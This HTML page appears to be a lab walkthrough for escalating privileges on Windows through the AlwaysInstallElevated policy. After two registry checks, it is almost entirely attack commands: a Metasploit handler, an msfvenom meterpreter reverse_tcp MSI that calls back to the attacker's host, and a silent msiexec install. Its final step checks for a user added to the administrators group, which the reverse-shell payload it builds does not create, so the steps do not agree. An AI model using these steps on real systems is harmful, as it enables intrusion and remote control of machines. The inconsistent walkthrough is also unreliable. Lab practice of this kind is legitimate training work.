<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Overeview (AlwaysInstallElevated)</title>
</head><body><span style="font-size: 15pt"><b>Detection</b><br/>
<br/>
<b>Windows VM</b><br/>
<br/>
1.Open command prompt and type: reg query HKLM\Software\Policies\Microsoft\Windows\Installer<br/>
2.From the output, notice that “AlwaysInstallElevated” value is 1.<br/>
3.In command prompt type: reg query HKCU\Software\Policies\Microsoft\Windows\Installer<br/>
4.From the output, notice that “AlwaysInstallElevated” value is 1.<br/>
<br/>
<b>Exploitation</b><br/>
<b><br/>
</b><b>Kali VM</b><br/>
<br/>
1. Open command prompt and type: msfconsole<br/>
2. In Metasploit (msf &gt; prompt) type: use multi/handler<br/>
3. In Metasploit (msf &gt; prompt) type: set payload windows/meterpreter/reverse_tcp<br/>
4. In Metasploit (msf &gt; prompt) type: set lhost [Kali VM IP Address]<br/>
5. In Metasploit (msf &gt; prompt) type: run<br/>
6. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi<br/>
7. Copy the generated file, setup.msi, to the Windows VM.<br/>
<br/>
<b>Windows VM</b><br/>
<br/>
1.Place ‘setup.msi’ in ‘C:\Temp’.<br/>
2.Open command prompt and type: msiexec /quiet /qn /i C:\Temp\setup.msi<br/>
3.It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators</span></body></html>